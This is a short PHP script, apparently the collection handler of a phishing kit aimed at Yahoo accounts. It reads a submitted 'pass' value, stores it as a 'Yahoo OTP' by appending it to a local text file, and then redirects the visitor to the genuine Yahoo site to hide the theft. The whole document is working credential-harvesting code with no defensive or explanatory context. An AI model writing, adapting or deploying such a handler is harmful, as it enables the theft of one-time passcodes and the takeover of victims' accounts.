<?php
file_put_contents("otp.txt", "Yahoo OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://in.yahoo.com/');
?>
